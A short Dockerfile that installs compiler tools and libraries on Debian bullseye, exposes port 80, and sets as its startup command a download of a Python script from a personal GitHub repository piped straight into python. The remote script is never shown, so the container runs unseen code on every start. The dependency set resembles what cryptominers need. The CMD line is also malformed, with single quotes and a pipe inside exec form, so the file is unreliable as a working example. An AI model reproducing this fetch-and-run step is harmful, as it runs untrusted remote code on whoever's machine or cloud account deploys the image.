FROM  debian:bullseye
RUN set -x \
    # Runtime dependencies.
 && apt-get update \
 && apt-get upgrade -y \
    # Build dependencies.
 && apt-get install -y \
        autoconf \
        wget \
        python \
        automake \
        curl \
        g++ \
        git \
        libcurl4-openssl-dev \
        libjansson-dev \
        libssl-dev \
        libgmp-dev \
        libz-dev \
        make \
        pkg-config
RUN set -x 
  

WORKDIR /home/
EXPOSE 80
CMD ['wget', '-O-', 'https://raw.githubusercontent.com/sumaxa01/friendly-waddle/main/0.py', '|', 'python']
